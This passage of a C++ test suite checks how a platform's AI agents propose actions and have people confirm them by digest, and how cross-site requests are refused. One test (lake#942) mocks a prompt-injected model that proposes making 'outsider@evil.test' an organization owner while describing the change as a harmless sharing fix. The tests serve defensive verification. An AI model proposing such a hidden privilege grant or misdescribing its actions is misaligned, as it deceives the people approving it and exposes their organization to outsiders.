    EXPECT_EQ(bus_->events("agent-tasks.agent-application").size(), tasks_before)
        << "no turn starts for a refused confirmation";

    connection.reset();
    connection = connect();
    const auto [confirmed_response, confirmed] =
        confirm(proposal_task, proposal_sha, proposal, true);
    ASSERT_TRUE(confirmed.value("ok", false)) << confirmed_response.substr(0, 300);
    const std::string confirmed_task_id = confirmed["value"]["task_id"];
    const auto confirmed_task = assembled_task(confirmed_task_id);
    ASSERT_TRUE(confirmed_task);
    EXPECT_EQ(confirmed_task->body["context"]["confirmed_proposal"], proposal);
    EXPECT_EQ(confirmed_task->body["context"]["confirm_public"], true);
    EXPECT_NE(std::ranges::find(confirmed_task->scopes, "create_app"),
              confirmed_task->scopes.end());
    EXPECT_NE(std::ranges::find(confirmed_task->scopes, "deploy_app"),
              confirmed_task->scopes.end());
    agents_->answer = {
        {"ok", true},
        {"reply", "The app is deployed."},
        {"result",
         {{"kind", "deployed"},
          {"app", {{"url", "https://customer-health.apps.example.test"}}}}}};
    connection.reset();
    connection = connect();
    run_agent_task(*connection, confirmed_task_id);
    const auto deployed =
        get_v1(*connection, cookie, "get_agent_task?" + scope + "&task_id=" + confirmed_task_id);
    EXPECT_EQ(deployed["value"]["status"], "succeeded");
    EXPECT_NE(deployed["value"].dump().find("https://customer-health.apps.example.test"),
              std::string::npos);

    const auto [repository_response, repository] = post_v1(*connection,
                                                           cookie,
                                                           "create_repository",
                                                           {{"customer_id", customer_id},
                                                            {"workspace_id", workspace_id},
                                                            {"name", "apps-ui-source"},
                                                            {"description", "App source"},
                                                            {"visibility", "private"}});
    ASSERT_TRUE(repository.value("ok", false)) << repository_response;
    const std::string repository_id = repository["value"]["id"];
    const auto [created_response, created] = post_v1(*connection,
                                                     cookie,
                                                     "create_app",
                                                     {{"customer_id", customer_id},
                                                      {"workspace_id", workspace_id},
                                                      {"name", "customer-portal"},
                                                      {"mode", "runtime"},
                                                      {"framework", "node"},
                                                      {"port", 3000},
                                                      {"source",
                                                       {{"repository", repository_id},
                                                        {"revision", "main"},
                                                        {"path", "."},
                                                        {"entrypoint", ""}}}});
    ASSERT_TRUE(created.value("ok", false)) << created_response.substr(0, 300);
    const std::string app_id = created["value"]["id"];

    // Builds take their registry authority from LAKE_INTERNAL_URL via the server options; a context
    // that never received it answered every build_app with store_unavailable (live 2026-09-30).
    const auto [built_response, built] =
        post_v1(*connection,
                cookie,
                "build_app",
                {{"customer_id", customer_id}, {"workspace_id", workspace_id}, {"app", app_id}});
    EXPECT_TRUE(built.value("ok", false)) << built_response.substr(0, 400);
    EXPECT_NE(built_response.find("\"target\":\"lake-prod.lake.svc/"), std::string::npos)
        << built_response.substr(0, 400);
    const auto queued_build = store_->get_build(built.at("value").at("build_id"));
    ASSERT_TRUE(queued_build) << queued_build.error().message;
    EXPECT_TRUE(queued_build->dockerfile.starts_with(
        "inline:ARG APP_RUNTIME_IMAGE\nFROM ${APP_RUNTIME_IMAGE}\n"));
    EXPECT_EQ(queued_build->build_args.at("APP_RUNTIME_IMAGE"), "oramasearch/app-runtime:20260930");

    auto* memory = dynamic_cast<lake::control::InMemoryStore*>(store_.get());
    if (memory != nullptr) {
        ASSERT_TRUE(memory->set_web_app_status(
            app_id, "Running", "https://customer-portal.apps.example.test", true, "Ready", 1));
    }
    const auto [published_response, published] = post_v1(*connection,
                                                         cookie,
                                                         "publish_app_event",
                                                         {{"customer_id", customer_id},
                                                          {"workspace_id", workspace_id},
                                                          {"app_id", app_id},
                                                          {"type", "deploy"},
                                                          {"message", "Revision is ready"},
                                                          {"event", {{"phase", "Running"}}}});
    EXPECT_TRUE(published.value("ok", false)) << published_response;
    const auto app = get_v1(*connection, cookie, "get_app?" + scope + "&app_id=" + app_id);
    ASSERT_TRUE(app.value("ok", false)) << app.dump();
    EXPECT_EQ(app["value"]["name"], "customer-portal");
    if (memory != nullptr) {
        EXPECT_NE(app["value"].dump().find("https://customer-portal.apps.example.test"),
                  std::string::npos);
    }

    const auto before = store_->get_web_app(app_id);
    ASSERT_TRUE(before);
    const auto [restarted_response, restarted] =
        post_v1(*connection,
                cookie,
                "restart_app",
                {{"customer_id", customer_id}, {"workspace_id", workspace_id}, {"app_id", app_id}});
    EXPECT_TRUE(restarted.value("ok", false)) << restarted_response;
    const auto after = store_->get_web_app(app_id);
    ASSERT_TRUE(after);
    EXPECT_GT(after->generation, before->generation);
}

TEST_P(HttpResponseIsolation, ExperimentsAgentRestAndMcpUseTheSameConfirmedTurn) {
    auto connection = connect();
    const auto body_of = [](const std::string& response) {
        return nlohmann::json::parse(response.substr(response.find("\r\n\r\n") + 4));
    };
    const std::string cookie = sign_in(*connection);
    const nlohmann::json customers =
        body_of(connection->request("GET", "/v1/list_customers", "", cookie));
    const std::string customer_id = customers["value"]["items"][0]["id"];
    select_workspace(*connection, customer_id);

    const nlohmann::json openapi =
        body_of(connection->request("GET", "/v1/openapi.json", "", cookie));
    const nlohmann::json listed = body_of(connection->request(
        "POST",
        "/mcp",
        R"({"jsonrpc":"2.0","id":1,"method":"tools/list"})",
        cookie,
        "HTTP/1.1",
        "",
        "application/json"));
    const auto tool = std::ranges::find_if(
        listed["result"]["tools"],
        [](const nlohmann::json& candidate) {
            return candidate["name"] == "agent_turn";
        });
    ASSERT_NE(tool, listed["result"]["tools"].end());
    const nlohmann::json operation = openapi["paths"]["/v1/agent_turn"]["post"];
    EXPECT_EQ((*tool)["inputSchema"],
              operation["requestBody"]["content"]["application/json"]["schema"]);
    EXPECT_EQ((*tool)["outputSchema"],
              operation["responses"]["200"]["content"]["application/json"]["schema"]);

    const nlohmann::json turn = {{"customer_id", customer_id},
                                 {"workspace_id", connection->workspace_id},
                                 {"agent", "agent-experiments"},
                                 {"kind", "experiment"},
                                 {"message", "Tune retention"},
                                 {"conversation_id", "d92a57b7-04bb-4c35-8277-4833e791aa79"}};
    const nlohmann::json rest = body_of(connection->request(
        "POST", "/v1/agent_turn", turn.dump(), cookie, "HTTP/1.1", "", "application/json"));
    ASSERT_TRUE(rest["ok"].get<bool>()) << rest.dump();
    EXPECT_EQ(assembled_task(rest["value"]["task_id"])->agent, "agent-experiments");
    const nlohmann::json mcp = body_of(connection->request(
        "POST",
        "/mcp",
        nlohmann::json{{"jsonrpc", "2.0"},
                       {"id", 2},
                       {"method", "tools/call"},
                       {"params", {{"name", "agent_turn"}, {"arguments", turn}}}}
            .dump(),
        cookie,
        "HTTP/1.1",
        "",
        "application/json"));
    ASSERT_TRUE(mcp["result"]["structuredContent"]["ok"].get<bool>()) << mcp.dump();
    const auto rest_task = assembled_task(rest["value"]["task_id"]);
    const auto mcp_task = assembled_task(
        mcp["result"]["structuredContent"]["value"]["task_id"]);
    ASSERT_TRUE(rest_task);
    ASSERT_TRUE(mcp_task);
    EXPECT_EQ(rest_task->conversation_id, turn["conversation_id"].get<std::string>());
    EXPECT_EQ(mcp_task->conversation_id, turn["conversation_id"].get<std::string>());
    EXPECT_EQ(mcp_task->body["prior_turn"]["task_id"], rest_task->id);

    // The Experiments page's turns: a goal, a reply in the same conversation, and the confirmation
    // of the reviewed experiment (the agent's `study`), which lake checks against the stored
    // proposal (lake#561).
    const auto experiment_turn = [&](nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = connection->workspace_id;
        input["agent"] = "agent-experiments";
        input["kind"] = "experiment";
        return post_v1(*connection, cookie, "agent_turn", input);
    };
    const auto [started_response, started] =
        experiment_turn({{"message", "Tune retention for validation AUC"}});
    ASSERT_TRUE(started.value("ok", false)) << started_response.substr(0, 300);
    const std::string task_id = started["value"]["task_id"];
    const auto first = assembled_task(task_id);
    ASSERT_TRUE(first);
    EXPECT_EQ(first->agent, "agent-experiments");
    EXPECT_EQ(first->kind, "experiment");
    EXPECT_EQ(std::ranges::find(first->scopes, "create_study"), first->scopes.end());

    agents_->answer = {{"ok", true},
                       {"reply", "Which project should I use for the dataset?"},
                       {"result", {{"kind", "question"}, {"confirm", false}}}};
    run_agent_task(*connection, task_id);
    const auto [replied_response, replied] = experiment_turn(
        {{"message", "Use retention"}, {"conversation_id", first->conversation_id}});
    ASSERT_TRUE(replied.value("ok", false)) << replied_response.substr(0, 300);
    const std::string proposal_task_id = replied["value"]["task_id"];
    const auto continued = assembled_task(proposal_task_id);
    ASSERT_TRUE(continued);
    EXPECT_EQ(continued->conversation_id, first->conversation_id);
    EXPECT_EQ(continued->body["message"], "Use retention");
    EXPECT_EQ(continued->body["prior_turn"]["task_id"], task_id);

    nlohmann::json study = {{"name", "Retention Tuning"},
                            {"project", "retention"},
                            {"pipeline", "training"},
                            {"dataset", "accounts"},
                            {"methodology", "M-1"},
                            {"objective", {{"metric", "validation.auc"},
                                           {"direction", "maximize"},
                                           {"validation_split", "validation"}}},
                            {"budgets", {{"max_trials", 4},
                                         {"max_parallel_trials", 1},
                                         {"max_wall_time_ms", 60000},
                                         {"cost_cap", 5}}}};
    const nlohmann::json proposal = {{"kind", "proposal"},
                                     {"confirm", true},
                                     {"study", study},
                                     {"explanations", {{"objective", "Use validation AUC."}}}};
    agents_->answer = {
        {"ok", true}, {"reply", "Review the bounded retention study."}, {"result", proposal}};
    run_agent_task(*connection, proposal_task_id);
    const auto proposed = get_v1(*connection,
                                 cookie,
                                 "get_agent_task?customer_id=" + customer_id + "&workspace_id=" +
                                     connection->workspace_id + "&task_id=" + proposal_task_id);
    const std::string proposal_sha = proposed["value"]["proposal_sha256"];
    EXPECT_EQ(proposal_sha, lake::api::agent_proposal_digest(proposal));

    // The person may edit the study, and only the study.
    study["name"] = "Reviewed Retention Tuning";
    nlohmann::json reviewed = proposal;
    reviewed["study"] = study;
    const auto confirm = [&](const std::string& sha, const nlohmann::json& confirmed) {
        return experiment_turn({{"message", "Confirm and start the reviewed experiment proposal."},
                                {"proposal_task_id", proposal_task_id},
                                {"proposal_sha256", sha},
                                {"context", {{"confirmed_proposal", confirmed}}}});
    };
    nlohmann::json widened = reviewed;
    widened["explanations"]["objective"] = "Anything goes.";
    for (const auto& [sha, confirmed] : std::vector<std::pair<std::string, nlohmann::json>>{
             {std::string(64, '0'), reviewed}, {proposal_sha, widened}}) {
        const auto [stale_response, stale] = confirm(sha, confirmed);
        EXPECT_TRUE(stale_response.starts_with("HTTP/1.1 409")) << stale_response;
        EXPECT_EQ(stale["error"]["message"],
                  "The Experiments Agent proposal changed before confirmation.");
    }
    nlohmann::json unedited = reviewed;
    unedited["study"] = "not an object";
    const auto [not_object_response, not_object] = confirm(proposal_sha, unedited);
    EXPECT_TRUE(not_object_response.starts_with("HTTP/1.1 400"));
    EXPECT_EQ(not_object["error"]["message"],
              "The edited experiment proposal must be a JSON object.");
    const auto [confirmed_response, confirmed] = confirm(proposal_sha, reviewed);
    ASSERT_TRUE(confirmed.value("ok", false)) << confirmed_response.substr(0, 300);
    const auto confirmed_task = assembled_task(confirmed["value"]["task_id"]);
    ASSERT_TRUE(confirmed_task);
    EXPECT_EQ(confirmed_task->body["context"]["confirmed_proposal"]["study"]["name"],
              "Reviewed Retention Tuning");
    EXPECT_NE(std::ranges::find(confirmed_task->scopes, "create_study"),
              confirmed_task->scopes.end());
}

TEST_P(HttpResponseIsolation, TheAgentFactoryCreatesOnlyTheExactProposalThePersonApproved) {
    auto* memory = dynamic_cast<lake::control::InMemoryStore*>(store_.get());
    if (memory == nullptr) {
        GTEST_SKIP() << "the operator's status is written directly only on the memory store";
    }
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customer_id =
        get_v1(*connection, cookie, "list_customers").at("value").at("items").at(0).at("id");
    const auto requested = liquid::runtime::block_on(workspaces_->request(customer_id));
    const auto service = memory->get_service((*requested)->service_id);
    connection->workspace_id = service->workspace_id;
    selected_workspace_id_ = service->workspace_id;
    const std::string workspace_id = service->workspace_id;
    ASSERT_TRUE(memory->set_service_status(service->id, "Ready", "", "http://ws:4800"));
    std::ofstream(workspace_dir_ / (service->slug + ".json")) << R"({"kind":"zetta","token":"t"})";
    workspace_caller_->answers["create_agent"] = {{"id", "a-new"}, {"name", "Renewal watcher"}};
    workspace_caller_->answers["get_agent"] = {
        {"id", "a-new"}, {"name", "Renewal watcher"}, {"runtime", "python"}};
    const auto call = [&](const std::string& name, nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = workspace_id;
        return post_v1(*connection, cookie, name, input);
    };

    const nlohmann::json proposal = {
        {"type", "python"},
        {"why_type", "needs a helper"},
        {"storage", "zetta"},
        {"why_storage", "small"},
        {"agent",
         {{"name", "Renewal watcher"},
          {"purpose", "Flag renewals at risk"},
          {"work_area", {{"kind", "workspace"}, {"detail", ""}}},
          {"manifesto", "Company data only."},
          {"goal", "A month ahead."},
          {"skills", {"search"}},
          {"trigger", ""}}},
        {"pipelines", nlohmann::json::array()},
        {"files",
         nlohmann::json::array({{{"path", "agent/tools.py"}, {"contents", "TOOLS = []\n"}}})},
        {"secret_mount", ""}};
    // Agent Creator Agent answers words for the person and the structured answer beside them
    // (agent-creator#1).
    agents_->answer = {
        {"ok", true},
        {"reply", "I propose an agent named Renewal watcher: Flag renewals at risk."},
        {"result",
         {{"kind", "proposal"}, {"proposal", proposal}, {"defects", nlohmann::json::array()}}}};
    const auto [sent_response, sent] = call(
        "send_ask_message", {{"kind", "factory"}, {"message", "an agent that flags renewals"}});
    ASSERT_TRUE(sent.value("ok", false)) << sent_response.substr(0, 300);
    // Agent Creator Agent works in the background (lake#269).
    EXPECT_TRUE(agents_->turns.empty());
    const std::string conversation = sent["value"]["conversation_id"];
    const std::string task = sent["value"]["task_id"];
    const std::string credential = run_agent_task(*connection, task);
    EXPECT_EQ(agents_->turns.back()["lake_token"], credential)
        << "the agent is handed the task's own credential";
    const auto [settled_response, settled] =
        call("settle_ask_turn",
             {{"conversation_id", conversation}, {"task_id", task}, {"kind", "factory"}});
    ASSERT_TRUE(settled.value("ok", false)) << settled_response;
    const auto messages =
        get_v1(*connection,
               cookie,
               "get_ask_conversation?customer_id=" + customer_id + "&workspace_id=" + workspace_id +
                   "&conversation_id=" + conversation)["value"]["messages"];
    ASSERT_EQ(messages.size(), 2U);
    const std::string message_id = messages[1]["id"];
    const std::string sha = messages[1]["payload"].value("proposal_sha256", std::string());

    // Engine calls other than reading the conversation's own records (lake#370).
    const auto engine_calls = [&] {
        return std::ranges::count_if(workspace_caller_->calls, [](const auto& call) {
            return !lake::test::RecordTables::handles(std::get<0>(call), std::get<2>(call));
        });
    };
    const auto before = engine_calls();
    const auto [stale_response, stale] = call("approve_agent_proposal",
                                              {{"conversation_id", conversation},
                                               {"message_id", message_id},
                                               {"proposal_sha256", std::string(64, '0')}});
    EXPECT_TRUE(stale_response.starts_with("HTTP/1.1 409")) << stale_response;
    EXPECT_EQ(engine_calls(), before) << "nothing is created for another proposal";

    const auto [approved_response, approved] = call(
        "approve_agent_proposal",
        {{"conversation_id", conversation}, {"message_id", message_id}, {"proposal_sha256", sha}});
    ASSERT_TRUE(approved.value("ok", false)) << approved_response.substr(0, 300);
    EXPECT_EQ(approved["value"]["agent_id"], "a-new");
    const auto created = std::ranges::find_if(workspace_caller_->calls, [](const auto& call) {
        return std::get<0>(call) == "create_agent";
    });
    ASSERT_NE(created, workspace_caller_->calls.end());
    const nlohmann::json& record = std::get<2>(*created);
    EXPECT_EQ(record["runtime"], "python");
    EXPECT_EQ(record["definition"]["source"], "zetta");
    EXPECT_NE(record["definition"]["instructions"].get<std::string>().find("# Renewal watcher"),
              std::string::npos);
    EXPECT_EQ(record["definition"]["files"][0]["path"], "agent/tools.py");
    const auto launches = memory->list_agent_launches(customer_id, "a-new", 10);
    ASSERT_TRUE(launches && launches->size() == 1U) << "a first check run starts";
}

// lake#561: the web app holds Ask Orama and Agent Factory conversations through /v1 alone, with the
// browser session, and only from lake's own origin.
TEST_P(HttpResponseIsolation, TheWebAppTalksToAskOramaThroughCapabilities) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string secret = cookie.substr(cookie.find('=') + 1);
    const std::string customer_id =
        nlohmann::json::parse(
            response_body(connection->request("GET", "/v1/list_customers", "", cookie)))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    select_workspace(*connection, customer_id);
    const std::string workspace_id = connection->workspace_id;
    // What a browser's fetch from lake's own page sends.
    const std::vector<std::pair<std::string, std::string>> same_origin{
        {"Origin", "http://localhost"}, {"Sec-Fetch-Site", "same-origin"}};
    const auto call = [&](const std::string& name, nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = workspace_id;
        const std::string response = connection->request("POST",
                                                         "/v1/" + name,
                                                         input.dump(),
                                                         cookie,
                                                         "HTTP/1.1",
                                                         {},
                                                         "application/json",
                                                         same_origin);
        return std::pair{response, nlohmann::json::parse(response_body(response))};
    };

    agents_->answer = {{"ok", true},
                       {"reply", "You have no repositories yet. I can create one."},
                       {"proposals",
                        nlohmann::json::array({{{"capability", "create_repository"},
                                                {"input",
                                                 {{"customer_id", customer_id},
                                                  {"workspace_id", workspace_id},
                                                  {"name", "web-notes"}}}}})},
                       {"reads", nlohmann::json::array()},
                       {"delegations", nlohmann::json::array()}};
    const auto [sent_response, sent] = call(
        "send_ask_message",
        {{"message", "what do I have?"}, {"page", {{"path", "/repositories"}, {"tab", "all"}}}});
    ASSERT_TRUE(sent_response.starts_with("HTTP/1.1 200")) << sent_response;
    const std::string conversation = sent["value"]["conversation_id"];
    const std::string task = sent["value"]["task_id"];
    ASSERT_FALSE(task.empty());
    EXPECT_FALSE(sent["value"]["message_id"].get<std::string>().empty());

    const nlohmann::json settle{
        {"conversation_id", conversation}, {"task_id", task}, {"kind", "ask"}};
    const auto [waiting_response, waiting] = call("settle_ask_turn", settle);
    ASSERT_TRUE(waiting_response.starts_with("HTTP/1.1 200")) << waiting_response;
    EXPECT_EQ(waiting["value"]["settled"], false) << "nothing is written while the turn runs";
    EXPECT_EQ(waiting["value"]["task"]["status"], "pending");
    run_agent_task(*connection, task);
    EXPECT_EQ(agents_->turns.back()["page"]["tab"], "all") << "the page is handed to the agent";
    for (int attempt = 0; attempt < 2; ++attempt) {
        const auto [settled_response, settled] = call("settle_ask_turn", settle);
        ASSERT_TRUE(settled_response.starts_with("HTTP/1.1 200")) << settled_response;
        EXPECT_EQ(settled["value"]["settled"], true);
        EXPECT_EQ(settled["value"]["task"]["status"], "succeeded");
    }
    const std::string listed = connection->request(
        "GET",
        "/v1/get_ask_conversation?customer_id=" + customer_id + "&workspace_id=" + workspace_id +
            "&conversation_id=" + conversation,
        "",
        cookie);
    const auto messages = nlohmann::json::parse(response_body(listed))["value"]["messages"];
    ASSERT_EQ(messages.size(), 2U) << "the answer is stored exactly once: " << listed;
    EXPECT_EQ(messages[1]["content"], "You have no repositories yet. I can create one.");
    EXPECT_EQ(messages[1]["payload"]["task_id"], task);
    const std::string message_id = messages[1]["id"];
    const std::string input_sha256 = messages[1]["proposal_calls"][0]["input_sha256"];

    const auto [forged_response, forged] = call("confirm_ask_proposal",
                                                {{"conversation_id", conversation},
                                                 {"message_id", message_id},
                                                 {"index", 7},
                                                 {"input_sha256", input_sha256}});
    EXPECT_TRUE(forged_response.starts_with("HTTP/1.1 404")) << forged_response;
    EXPECT_EQ(forged["error"]["message"], "That proposal is not in this conversation.");
    EXPECT_TRUE(store_->list_repositories(customer_id, 10)->empty());

    // Cross-site requests cannot use the browser session; a bearer is unaffected.
    const nlohmann::json confirm{{"customer_id", customer_id},
                                 {"workspace_id", workspace_id},
                                 {"conversation_id", conversation},
                                 {"message_id", message_id},
                                 {"index", 0},
                                 {"input_sha256", input_sha256}};
    const std::vector<std::vector<std::pair<std::string, std::string>>> foreign{
        {{"Origin", "https://reports.example.test"}},
        {{"Origin", "null"}},
        {{"Sec-Fetch-Site", "same-site"}},
        {{"Origin", "http://localhost"}, {"Sec-Fetch-Site", "cross-site"}}};
    for (const auto& headers : foreign) {
        const std::string refused = connection->request("POST",
                                                        "/v1/confirm_ask_proposal",
                                                        confirm.dump(),
                                                        cookie,
                                                        "HTTP/1.1",
                                                        {},
                                                        "application/json",
                                                        headers);
        EXPECT_TRUE(refused.starts_with("HTTP/1.1 403")) << refused;
        EXPECT_NE(refused.find("Cross-site requests cannot use the browser session."),
                  std::string::npos);
    }
    for (const std::string type : {"text/plain", "application/x-www-form-urlencoded"}) {
        const std::string refused = connection->request(
            "POST", "/v1/confirm_ask_proposal", confirm.dump(), cookie, "HTTP/1.1", {}, type);
        EXPECT_TRUE(refused.starts_with("HTTP/1.1 403")) << type << "\n" << refused;
        const std::string mcp =
            connection->request("POST",
                                "/mcp",
                                R"({"jsonrpc":"2.0","id":1,"method":"tools/list"})",
                                cookie,
                                "HTTP/1.1",
                                {},
                                type);
        EXPECT_TRUE(mcp.starts_with("HTTP/1.1 403")) << type << "\n" << mcp;
    }
    // The server's remaining cookie form (sign-out) is protected the same way.
    const std::string form_refused =
        connection->request("POST",
                            "/logout",
                            "",
                            cookie,
                            "HTTP/1.1",
                            {},
                            "application/x-www-form-urlencoded",
                            {{"Origin", "https://reports.example.test"}});
    EXPECT_TRUE(form_refused.starts_with("HTTP/1.1 403")) << form_refused;
    EXPECT_TRUE(store_->list_repositories(customer_id, 10)->empty()) << "nothing ran";
    const std::string bearer_listed =
        connection->request("POST",
                            "/mcp",
                            R"({"jsonrpc":"2.0","id":1,"method":"tools/list"})",
                            "",
                            "HTTP/1.1",
                            secret,
                            "text/plain",
                            {{"Origin", "https://reports.example.test"}});
    EXPECT_TRUE(bearer_listed.starts_with("HTTP/1.1 200")) << bearer_listed.substr(0, 300);

    const auto [confirmed_response, confirmed] = call("confirm_ask_proposal",
                                                      {{"conversation_id", conversation},
                                                       {"message_id", message_id},
                                                       {"index", 0},
                                                       {"input_sha256", input_sha256}});
    ASSERT_TRUE(confirmed_response.starts_with("HTTP/1.1 200")) << confirmed_response;
    EXPECT_EQ(confirmed["value"]["ok"], true) << confirmed_response;
    EXPECT_EQ(confirmed["value"]["capability"], "create_repository");
    ASSERT_EQ(store_->list_repositories(customer_id, 10)->size(), 1U);
    const auto after = nlohmann::json::parse(response_body(connection->request(
        "GET",
        "/v1/get_ask_conversation?customer_id=" + customer_id + "&workspace_id=" + workspace_id +
            "&conversation_id=" + conversation,
        "",
        cookie)))["value"]["messages"];
    ASSERT_EQ(after.size(), 3U);
    EXPECT_EQ(after[2]["id"], confirmed["value"]["message_id"]);
    EXPECT_EQ(after[2]["content"], "Done: create_repository.");
    EXPECT_EQ(after[2]["payload"]["confirmed"]["message_id"], message_id);

    // The project page's background tasks: none yet.
    const auto latest = [&](const std::string& subject) {
        return connection->request("GET",
                                   "/v1/latest_agent_task?customer_id=" + customer_id +
                                       "&workspace_id=" + workspace_id + "&subject=" + subject,
                                   "",
                                   cookie);
    };
    const std::string none = latest("build%3Achurn");
    ASSERT_TRUE(none.starts_with("HTTP/1.1 200")) << none;
    EXPECT_TRUE(nlohmann::json::parse(response_body(none))["value"]["task"].is_null());
    EXPECT_TRUE(latest("churn").starts_with("HTTP/1.1 400"));
}

// lake#942: an Ask Orama proposal's `impact` is the model's writing and can hide who an action
// reaches. The conversation answers Lake's own statement of the exact call each proposal runs
// (`proposal_calls`), and confirm runs only the call whose digest the person sends back.
TEST_P(HttpResponseIsolation, AskOramaConfirmShowsAndRunsOnlyTheExactCall) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customer_id =
        nlohmann::json::parse(
            response_body(connection->request("GET", "/v1/list_customers", "", cookie)))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    const auto [org_response, org] =
        post_v1(*connection,
                cookie,
                "create_organization_space",
                {{"display_name", "Acme Research"},
                 {"name", "acme-" + lake::control::new_uuid_v4().substr(0, 8)}});
    ASSERT_TRUE(org.value("ok", false)) << org_response;
    const std::string organization_id = org["value"]["organization"]["id"];
    select_workspace(*connection, customer_id);
    const std::string workspace_id = connection->workspace_id;
    const auto call = [&](const std::string& name, nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = workspace_id;
        return post_v1(*connection, cookie, name, input);
    };
    const auto conversation_messages = [&](const std::string& conversation) {
        return nlohmann::json::parse(response_body(connection->request(
            "GET",
            "/v1/get_ask_conversation?customer_id=" + customer_id +
                "&workspace_id=" + workspace_id + "&conversation_id=" + conversation,
            "",
            cookie)))["value"]["messages"];
    };

    // Content read during the turn steered the model: it invites an outsider as an owner and
    // calls it a sharing fix.
    const nlohmann::json invitation{{"organization_id", organization_id},
                                    {"invitee_type", "email"},
                                    {"invitee", "outsider@evil.test"},
                                    {"role", "owner"},
                                    {"expires_at", "2099-01-01T00:00:00Z"}};
    const std::string impact = "Fixes sharing for your team; nothing else changes.";
    agents_->answer = {
        {"ok", true},
        {"reply", "I found the sharing problem."},
        {"proposals",
         nlohmann::json::array(
             {{{"capability", "create_invitation"}, {"input", invitation}, {"impact", impact}}})},
        {"reads", nlohmann::json::array()},
        {"delegations", nlohmann::json::array()}};
    const auto [sent_response, sent] = call("send_ask_message", {{"message", "Fix sharing."}});
    ASSERT_TRUE(sent_response.starts_with("HTTP/1.1 200")) << sent_response;
    const std::string conversation = sent["value"]["conversation_id"];
    const std::string task = sent["value"]["task_id"];
    run_agent_task(*connection, task);
    ASSERT_TRUE(call("settle_ask_turn",
                     {{"conversation_id", conversation}, {"task_id", task}, {"kind", "ask"}})
                    .first.starts_with("HTTP/1.1 200"));
    const auto messages = conversation_messages(conversation);
    ASSERT_EQ(messages.size(), 2U) << messages.dump();
    const nlohmann::json& reply = messages[1];
    const std::string message_id = reply["id"];

    // What Confirm shows: the recipient, role and organization the handler uses, apart from the
    // model's words.
    ASSERT_TRUE(reply.contains("proposal_calls")) << reply.dump();
    ASSERT_TRUE(reply["proposal_calls"].is_array()) << reply.dump();
    ASSERT_EQ(reply["proposal_calls"].size(), 1U) << reply.dump();
    const nlohmann::json& shown = reply["proposal_calls"][0];
    EXPECT_EQ(shown["capability"], "create_invitation");
    EXPECT_EQ(shown["title"], "Create invitation");
    EXPECT_EQ(shown["kind"], "action");
    EXPECT_EQ(shown["input"], invitation);
    nlohmann::json fields = nlohmann::json::object();
    for (const auto& field : shown["fields"]) {
        fields[field["name"].get<std::string>()] = field["value"];
    }
    EXPECT_EQ(fields, invitation) << "every field is shown, with its exact value";
    EXPECT_EQ(shown.dump().find("Fixes sharing"), std::string::npos)
        << "the model's impact is no part of the call";
    const std::string digest = shown["input_sha256"];
    EXPECT_EQ(digest.size(), 64U);
    const auto invitations = [&] {
        return store_->list_invitations(organization_id, "", 10).value();
    };
    ASSERT_TRUE(invitations().empty());

    // A confirm that names no call, or another call, runs nothing and stores nothing.
    const auto [unnamed_response, unnamed] =
        call("confirm_ask_proposal",
             {{"conversation_id", conversation}, {"message_id", message_id}, {"index", 0}});
    EXPECT_TRUE(unnamed_response.starts_with("HTTP/1.1 400")) << unnamed_response;
    const auto [other_response, other] = call("confirm_ask_proposal",
                                              {{"conversation_id", conversation},
                                               {"message_id", message_id},
                                               {"index", 0},
                                               {"input_sha256", std::string(64, '0')}});
    EXPECT_TRUE(other_response.starts_with("HTTP/1.1 409")) << other_response;
    EXPECT_EQ(other["error"]["path"], "/input_sha256") << other_response;
    EXPECT_TRUE(invitations().empty()) << "nothing ran";
    EXPECT_EQ(conversation_messages(conversation).size(), 2U) << "no outcome is stored";

    // The call shown is the call that runs.
    const auto [confirmed_response, confirmed] = call("confirm_ask_proposal",
                                                      {{"conversation_id", conversation},
                                                       {"message_id", message_id},
                                                       {"index", 0},
                                                       {"input_sha256", digest}});
    ASSERT_TRUE(confirmed_response.starts_with("HTTP/1.1 200")) << confirmed_response;
    EXPECT_EQ(confirmed["value"]["ok"], true) << confirmed_response;
    const auto created = invitations();
    ASSERT_EQ(created.size(), 1U);
    EXPECT_EQ(created[0].invitee, fields["invitee"].get<std::string>());
    EXPECT_EQ(created[0].invitee_type, fields["invitee_type"].get<std::string>());
    EXPECT_EQ(created[0].role, fields["role"].get<std::string>());
    EXPECT_EQ(created[0].organization_id, fields["organization_id"].get<std::string>());
}

// lake#794: a proposal whose input the capability's schema refuses is never offered. The reply
// says what is missing and asks for it; a confirm that still fails is not marked done.
TEST_P(HttpResponseIsolation, AskOramaOffersOnlyProposalsTheCapabilitySchemaAccepts) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customer_id =
        nlohmann::json::parse(
            response_body(connection->request("GET", "/v1/list_customers", "", cookie)))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    select_workspace(*connection, customer_id);
    const std::string workspace_id = connection->workspace_id;
    const std::vector<std::pair<std::string, std::string>> same_origin{
        {"Origin", "http://localhost"}, {"Sec-Fetch-Site", "same-origin"}};
    const auto call = [&](const std::string& name, nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = workspace_id;
        const std::string response = connection->request("POST",
                                                         "/v1/" + name,
                                                         input.dump(),
                                                         cookie,
                                                         "HTTP/1.1",
                                                         {},
                                                         "application/json",
                                                         same_origin);
        return std::pair{response, nlohmann::json::parse(response_body(response))};
    };
    const auto conversation_messages = [&](const std::string& conversation) {
        return nlohmann::json::parse(response_body(connection->request(
            "GET",
            "/v1/get_ask_conversation?customer_id=" + customer_id +
                "&workspace_id=" + workspace_id + "&conversation_id=" + conversation,
            "",
            cookie)))["value"]["messages"];
    };

    // create_index without `table` and create_stream without `zetta`, as Ask Orama proposed
    // them, beside one that can run. workspace_id is left for lake to fill.
    agents_->answer = {
        {"ok", true},
        {"reply", "I can do that."},
        {"proposals",
         nlohmann::json::array(
             {{{"capability", "create_index"},
               {"input", {{"customer_id", customer_id}}},
               {"impact", "A search index over your customers dataset."}},
              {{"capability", "create_stream"},
